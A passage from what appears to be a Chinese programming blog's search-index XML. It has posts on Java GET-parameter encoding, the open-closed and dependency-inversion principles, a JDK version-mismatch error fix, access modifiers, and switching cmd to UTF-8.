class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; values.length; i++) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="comment">// 处理get乱码</span></span><br><span class="line">                                values[i] = <span class="keyword">new</span> String(values[i]</span><br><span class="line">                                                       .getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                hasEncode = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> parameterMap;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.getParameterMap();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//取一个值</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getParameter</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, String[]&gt; parameterMap = getParameterMap();</span><br><span class="line">        String[] values = parameterMap.get(name);</span><br><span class="line">        <span class="keyword">if</span> (values == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> values[<span class="number">0</span>]; <span class="comment">// 取回参数的第一个值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//取所有值</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] getParameterValues(String name) &#123;</span><br><span class="line">        Map&lt;String, String[]&gt; parameterMap = getParameterMap();</span><br><span class="line">        String[] values = parameterMap.get(name);</span><br><span class="line">        <span class="keyword">return</span> values;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Spring</tag>
        <tag>中文乱码</tag>
        <tag>Get、Post请求</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式6大原则-开闭原则+依赖倒置原则</title>
    <url>/2021/10/20/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F6%E5%A4%A7%E5%8E%9F%E5%88%99-%E5%BC%80%E9%97%AD%E5%8E%9F%E5%88%99-%E4%BE%9D%E8%B5%96%E5%80%92%E7%BD%AE%E5%8E%9F%E5%88%99/</url>
    <content><![CDATA[<h2 id="开闭原则（OCP）"><a href="#开闭原则（OCP）" class="headerlink" title="开闭原则（OCP）"></a>开闭原则（OCP）</h2><span id="more"></span>

<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>一个<strong>软件实体</strong>应当<strong>对扩展开放，对修改关闭（对原有代码尽量少进行修改，甚至不做修改，仅做扩展）</strong>。</p>
<p>开闭原则在<strong>定义实体类、功能模块类等</strong>的时候会体现的较为明显。</p>
<p>通俗的讲，添加一个功能应该是在已有的代码基础上进行扩展，而不是修改已有的代码。</p>
<h3 id="作用（目的）"><a href="#作用（目的）" class="headerlink" title="作用（目的）"></a>作用（目的）</h3><p><strong>我们为什么要遵循这个开闭原则呢？</strong></p>
<p>可能有很多人会觉得，在原来的代码基础上进行修改，好像没有出现什么问题或者困难。</p>
<p>原因就是在于要么运气好没遇到，要么就是项目还是太简单了，遇到的概率自然就会小。</p>
<p><strong>那么都会有哪些问题呢？</strong></p>
<p>后添加的功能，可能与原来的写好的代码，使用的依赖库不一样，也可能是原来的代码中有一些判断和后添加的功能所需要的判断在逻辑上较难分析……还有很多情况。</p>
<p>但是这些情况都是说明了一件事情，就是如果因为后添加的功能模块或者实体类，而修改了原来的代码，都可能会<strong>造成一定的风险</strong>或者<strong>程序上编写的困难</strong>。</p>
<p><strong>开闭原则好处</strong></p>
<p>此时我们如果按照开闭原则，有一个接口类，我们只需要再写一个实体类或者功能模块类implements接口类就行，有什么需求在接口中定义好方法后，在派生类中进行具体实现就行。（<strong>如此一来，降低了编程难度，降低了程序修改的风险</strong>）</p>
<p><strong>！！！重要的是说三遍！！！</strong></p>
<p><strong>优点：不用修改原来的代码</strong></p>
<p><strong>优点：不用修改原来的代码</strong></p>
<p><strong>优点：不用修改原来的代码</strong></p>
<h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><p><strong>关键就是对对象进行抽象</strong>。如果几个实体共属于同一个类别，我们就可以把这个<strong>共同类</strong>别<strong>抽象出来</strong>。然后实体分别来<strong>implements</strong>这个抽象类。每当多出一个该抽象类的具体实体类的时候，我们只要再写一个类来继续implements这个抽象类即可。</p>
<p>在这个过程中，我们就是遵循了开闭原则。</p>
<h3 id="通过案例来理解"><a href="#通过案例来理解" class="headerlink" title="通过案例来理解"></a>通过案例来理解</h3><p>本案例以实体类为例讲解（对于功能模块也是一样的道理）</p>
<blockquote>
<p>时间段①：有一个人，叫张三，想要调查一个事情，就是现在婴儿吃饭是怎么吃的，我们就用<strong>Test</strong>类来代表张三这个个体（相当于客户端）。然后一个类叫<strong>Query</strong>的类，它可以帮助查询这个问题的答案。</p>
</blockquote>
<p>常规做法：</p>
<p><img src="https://i.loli.net/2021/10/21/LtU9TNHslBMuJ3v.png" alt="image-20211021014254617"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Query query = <span class="keyword">new</span> Query();</span><br><span class="line">        Baby baby = <span class="keyword">new</span> Baby();</span><br><span class="line">        query.query(baby);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;		<span class="comment">//调查工具</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">(Baby baby)</span> </span>&#123;</span><br><span class="line">        baby.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> </span>&#123;		<span class="comment">//婴儿</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;婴儿吃饭要人喂&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>似乎没毛病，一点问题都没嘚</strong></p>
<p>但是，如果过了一万年（也就是你已经<strong>忘记了</strong>当时你的Query类中逻辑的时候），你遇到了新的需求：</p>
<blockquote>
<p>时间段②：张三又想调查一下大学生是怎么吃饭的，张三就对这个程序进行了修改。</p>
</blockquote>
<p><img src="https://i.loli.net/2021/10/21/E7YGyFRmBbj1wN6.png" alt="image-20211021014151368"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Query query = <span class="keyword">new</span> Query();</span><br><span class="line">        </span><br><span class="line">        Baby baby = <span class="keyword">new</span> Baby();</span><br><span class="line">        query.query(baby);</span><br><span class="line">        </span><br><span class="line">        CollageStudent collageStudent = <span class="keyword">new</span> CollageStudent();</span><br><span class="line">        query.queryCollageStudent(collageStudent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">(Baby baby)</span> </span>&#123;</span><br><span class="line">        baby.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//由于多了一个目标人群，所以修改了查询工具的源代码</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">queryCollageStudent</span><span class="params">(CollageStudent collageStudent)</span> </span>&#123;</span><br><span class="line">        collageStudent.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;婴儿吃饭要人喂&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CollageStudent</span> </span>&#123;			<span class="comment">//多了一个目标人群，大学生类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;大学生是自己喂自己吃饭的&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上面的过程中，貌似只要多一个查询的目标，就要多写一个方法，进行查询，似乎没什么问题。。。。。</p>
<p>但是，如果，碰到一下几种情况呢？</p>
<ul>
<li>如果新出现的类中，有些依赖和原来的程序中的一些依赖冲突了呢？</li>
<li>如果不是加一个方法，而是在一个方法中，进行添加一些查询条件，导致逻辑上的分析变得异常艰难呢？</li>
</ul>
<p>此时，不难发现，已经出现了一些上面提到的问题和风险了</p>
<blockquote>
<p>时间段③：张三后来又查了五六个目标人群后，也意识到了这个问题，于是就去找好朋友了，好朋友大葱鸣出面了！直接一句：“看我的！”。接着大葱鸣就给张三讲解了设计模式的开闭原则。张三顿悟！心中刹那有一妙计！</p>
</blockquote>
<h3 id="妙计为何？（解决方案）"><a href="#妙计为何？（解决方案）" class="headerlink" title="妙计为何？（解决方案）"></a>妙计为何？（解决方案）</h3><p><img src="https://i.loli.net/2021/10/21/nxuI1goWNzrDG2V.png" alt="image-20211021020001227"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Query query = <span class="keyword">new</span> Query();</span><br><span class="line">        Baby baby = <span class="keyword">new</span> Baby();</span><br><span class="line">        query.query(baby);</span><br><span class="line">        CollageStudent collageStudent = <span class="keyword">new</span> CollageStudent();</span><br><span class="line">        query.query(collageStudent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">(Person person)</span> </span>&#123;		<span class="comment">//自始至终，这个Query可以永远用下去，不需要发生修改</span></span><br><span class="line">        person.eat();	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span></span>&#123;							<span class="comment">//抽象出一个抽象类，可以定义为抽象类，也可以定义为接口</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> <span class="keyword">implements</span> <span class="title">Person</span></span>&#123;				<span class="comment">//继承Person类</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;婴儿吃饭要人喂&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CollageStudent</span> <span class="keyword">implements</span> <span class="title">Person</span></span>&#123;		<span class="comment">//继承Person类</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;大学生是自己喂自己吃饭的&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>如果是功能模块，也和实体类类似，尽量抽象出抽象类，遵从开闭原则，允许扩展，规避修改</p>
<p>目的就是一个，<strong>减少因后加的需求导致的修改原来代码的操作</strong></p>
<h2 id="依赖倒置原则（DIP）"><a href="#依赖倒置原则（DIP）" class="headerlink" title="依赖倒置原则（DIP）"></a>依赖倒置原则（DIP）</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>高层模块不依赖于底层，底层模块依赖于高层</p>
<p>抽象不应该依赖于细节，细节依赖于抽象</p>
<p>换言之：<strong>要针对接口编程，而不是针对实现编程</strong></p>
<h3 id="依赖倒置原则和开闭原则关系"><a href="#依赖倒置原则和开闭原则关系" class="headerlink" title="依赖倒置原则和开闭原则关系"></a>依赖倒置原则和开闭原则关系</h3><p>如果说，开闭原则是面向对象设计的目标，那么依赖倒置原则就是其实现机制</p>
<h3 id="要求做法"><a href="#要求做法" class="headerlink" title="要求做法"></a>要求做法</h3><p><strong>在程序中传递参数时，或者在关联关系中，尽量引用高层次的抽象层类，即使用接口和抽象类进行变量类型声明、方法返回类型声明，以及数据类型的转换等，而不是用具体类来做这些事情。</strong></p>
<p><strong>一个具体类仅实现接口或抽象类中定义的方法，不额外给出多余的方法，否则将无法调用到子类中增加的方法</strong></p>
<h3 id="依赖注入三种方式"><a href="#依赖注入三种方式" class="headerlink" title="依赖注入三种方式"></a>依赖注入三种方式</h3><p>在实现依赖倒置原则时，需要<strong>针对抽象层编程</strong>，将具体的对象通过<strong>依赖注入</strong>的方式注入到其他对象中</p>
<ol>
<li><strong>构造注入：</strong>通过构造函数传入抽象类指代的具体类的对象</li>
<li><strong>setter（设值）注入：</strong>通过setter方法传入抽象类指代的具体类的对象</li>
<li><strong>接口注入：</strong>通过在接口中声明的业务方法来传入抽象类指代的具体的对象</li>
</ol>
<p>举例：构造注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Baby baby = <span class="keyword">new</span> Baby();</span><br><span class="line">        Query query = <span class="keyword">new</span> Query(baby);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">    Person person = <span class="keyword">null</span>;</span><br><span class="line">    Query(Person person) &#123;				<span class="comment">//通过 构造方法注入 父类Person指代的子类Baby类对象</span></span><br><span class="line">        <span class="keyword">this</span>.person = person;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> <span class="keyword">implements</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;婴儿吃饭要人喂&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注：这些方法在定义的时候使用的都是抽象类型，在运行时，才传入具体类型的对象，由子类覆盖父类</strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>开闭原则可以说是面向对象程序设计的目的（降低风险，减少程序修改的需要），而依赖倒置原则就可以说是实现这个目标的手段</p>
]]></content>
      <tags>
        <tag>设计模式6大原则</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机执行所生成的jar文件报错：版本不支持</title>
    <url>/2021/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%89%A7%E8%A1%8C%E6%89%80%E7%94%9F%E6%88%90%E7%9A%84jar%E6%96%87%E4%BB%B6%E6%8A%A5%E9%94%99%E2%80%94%E2%80%94%E7%89%88%E6%9C%AC%E4%B8%8D%E6%94%AF%E6%8C%81/</url>
    <content><![CDATA[<h2 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h2><span id="more"></span>

<ul>
<li>在IDE编辑器中也会出现和本文中讨论的问题一样的错误，两种情况的原因是一样的，其解决方法可以参考我的另一篇文章：<a href="https://liu-ruyang.github.io/2021/05/29/MyEclipse%E2%80%94%E2%80%94jdk%E7%89%88%E6%9C%AC%E4%B8%8D%E6%94%AF%E6%8C%81/">MyEclipse——jdk版本不支持</a></li>
</ul>
<h2 id="报错信息："><a href="#报错信息：" class="headerlink" title="报错信息："></a>报错信息：</h2><pre><code>Error: A JNI error has occurred, please check your
installation and try again
Exception in thread &quot;main&quot; java.lang.UnsupportedClassVersionError: Option has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0
    at java.lang.ClassLoader.defineClass1(Native Method)
    at java.lang.ClassLoader.defineClass(Unknown Source)
    at java.security.SecureClassLoader.defineClass(Unknown Source)
    at java.net.URLClassLoader.defineClass(Unknown Source)
    at java.net.URLClassLoader.access$100(Unknown Source)
    at java.net.URLClassLoader$1.run(Unknown Source)
    at java.net.URLClassLoader$1.run(Unknown Source)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(Unknown Source)
    at java.lang.ClassLoader.loadClass(Unknown Source)
    at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source)
    at java.lang.ClassLoader.loadClass(Unknown Source)
    at sun.launcher.LauncherHelper.checkAndLoadMain(Unknown Source)
</code></pre>
<h3 id="具体报错（来波图更清楚）"><a href="#具体报错（来波图更清楚）" class="headerlink" title="具体报错（来波图更清楚）"></a>具体报错（来波图更清楚）</h3><ol>
<li>下面是我在idea中写java项目的时候所使用的jdk版本：jdk11<br><img src="https://i.loli.net/2021/06/11/4kM98ENw1rX3Ai7.png" alt="屏幕截图 2021-06-11 221943.png"></li>
<li>以下是我生成的jar文件所存放的地址<br><img src="https://i.loli.net/2021/06/11/JLrIlSF9aWjz3Bw.png" alt="屏幕截图 2021-06-11 220448.png"></li>
<li>项目在idea中的正常执行效果如下图<br><img src="https://i.loli.net/2021/06/11/5ydtn129GNIJVRE.png" alt="屏幕截图 2021-06-11 223921.png"></li>
<li> 可是，然后我在cmd中执行这个jar文件，开始报错，如下图<br><img src="https://i.loli.net/2021/06/11/nSP6EuXJTVUo5fO.png" alt="屏幕截图 2021-06-11 220834.png"><h2 id="原因解释："><a href="#原因解释：" class="headerlink" title="原因解释："></a>原因解释：</h2></li>
</ol>
<p><strong>简而言之：这是因为计算机上java的编译版本和java的运行版本不一致的原因</strong></p>
<ul>
<li><strong>尽管你是在环境变量中已经修改了jdk的配置如下图（我习惯是用的jdk11，所以以jdk11为例，其他版本也是一样的道理，操作过程一样）：</strong><br><img src="https://i.loli.net/2021/06/11/4DalxifhVoFLu2Y.png" alt="屏幕截图 2021-06-11 224304.png"></li>
<li><strong>但是仍然会发现，jar文件还会报上面的错误</strong><br><img src="https://i.loli.net/2021/06/11/nSP6EuXJTVUo5fO.png" alt="屏幕截图 2021-06-11 220834.png"><h3 id="原因验证步骤"><a href="#原因验证步骤" class="headerlink" title="原因验证步骤"></a>原因验证步骤</h3></li>
</ul>
<ol>
<li>查看编译版本：在cmd中输入以下命令，可以发现此时的java的运行版本是jdk11的 <code>java -version</code></li>
</ol>
<p><img src="https://i.loli.net/2021/06/11/aHPtkx7rbldA942.png" alt="屏幕截图 2021-06-11 221513.png"></p>
<ol start="2">
<li><p>查看java运行版本：在cmd中输入以下命令，可以发现此时的java的编译版本是jdk1.8</p>
<p> <code>javac -version</code></p>
</li>
</ol>
<p><img src="https://i.loli.net/2021/06/11/vG8HKV3Pc6TeF15.png" alt="屏幕截图 2021-06-11 221647.png"></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ul>
<li>之所以会出现以上的编译版本和运行版本不一样，原因在于最先安装IDE编译器的时候，可能自动帮你写了一个环境变量，如下图：<br><img src="https://i.loli.net/2021/06/11/wYStXrCxE4nig61.png" alt="屏幕截图 2021-06-11 222847.png"></li>
<li>这个路径下的有三个文件，见下图：<br><img src="https://i.loli.net/2021/06/11/xpgGWo1crdu8YnV.png" alt="屏幕截图 2021-06-11 224651.png"></li>
<li>在安装了jdk11后，并且将其添加到了环境变量中的路径中后，应当<strong>将上图中的三个文件都删除掉</strong></li>
</ul>
<h3 id="效果如图"><a href="#效果如图" class="headerlink" title="效果如图"></a>效果如图</h3><p>会发现此时的编译版本和运行版本都变成了jdk11了<br><img src="https://i.loli.net/2021/06/11/SewUKAoyj2qgRrY.png" alt="屏幕截图 2021-06-11 223533.png"><br>此时再运行一下之前生成的jar文件，就执行成功啦，嘿嘿！<br><img src="https://i.loli.net/2021/06/11/8mYHXxQC3ubLgzv.png" alt="屏幕截图 2021-06-11 223635.png"></p>
<p>到这就成功啦！！</p>
<p>喝彩！！ </p>
]]></content>
      <tags>
        <tag>jdk版本不支持</tag>
      </tags>
  </entry>
  <entry>
    <title>访问权限修饰符</title>
    <url>/2021/12/19/%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/</url>
    <content><![CDATA[<h2 id="Java中的访问权限"><a href="#Java中的访问权限" class="headerlink" title="Java中的访问权限"></a>Java中的访问权限</h2><span id="more"></span>

<table>
<thead>
<tr>
<th align="left">访问权限</th>
<th>本类</th>
<th>本包的类</th>
<th>子类</th>
<th>非子类的外包类</th>
</tr>
</thead>
<tbody><tr>
<td align="left">public</td>
<td>是</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td align="left">protected</td>
<td>是</td>
<td>是</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td align="left">default</td>
<td>是</td>
<td>是</td>
<td>否</td>
<td>否</td>
</tr>
<tr>
<td align="left">private</td>
<td>是</td>
<td>否</td>
<td>否</td>
<td>否</td>
</tr>
</tbody></table>
<h2 id="C-中派生类对基类的访问权限"><a href="#C-中派生类对基类的访问权限" class="headerlink" title="C++中派生类对基类的访问权限"></a>C++中派生类对基类的访问权限</h2><table>
<thead>
<tr>
<th>基类修饰符\继承方式</th>
<th>public</th>
<th>protected</th>
<th>private</th>
</tr>
</thead>
<tbody><tr>
<td>public</td>
<td>public</td>
<td>protected</td>
<td>private</td>
</tr>
<tr>
<td>protected</td>
<td>protected</td>
<td>protected</td>
<td>private</td>
</tr>
<tr>
<td>private</td>
<td>NO（即不可直接访问）</td>
<td>NO（即不可直接访问）</td>
<td>NO（即不可直接访问）</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>java访问权限修饰符</tag>
        <tag>C++访问权限修饰符</tag>
      </tags>
  </entry>
  <entry>
    <title>cmd临时修改编码格式</title>
    <url>/2021/10/16/cmd%E4%B8%B4%E6%97%B6%E4%BF%AE%E6%94%B9%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="CMD中修改编码格式"><a href="#CMD中修改编码格式" class="headerlink" title="CMD中修改编码格式"></a>CMD中修改编码格式</h2><span id="more"></span>

<p>在cmd中有时候需要以<strong>utf-8</strong>的编码格式显示数据</p>
<p>在打开的cmd中执行下面语句，即可以<strong>utf-8</strong>格式显示数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chcp 65001 </span><br></pre></td></tr></table></figure>

<p><strong>该语句仅在当前的cmd窗口中生效，重新打开cmd窗口后会恢复原来默认的GBK编码格式</strong></p>
<p>执行前：</p>
<p><img src="https://i.loli.net/2021/10/16/D3ENjtXdi6qIxBY.png" alt="image-20211016164131038"></p>
<p>执行后效果：</p>
<p><img src="https://i.loli.net/2021/10/16/UGw4cMdOmCuyEhn.png" alt="image-20211016164227381"></p>
]]></content>
      <tags>
        <tag>cmd编码格式</tag>
      </tags>
  </entry>
</search>
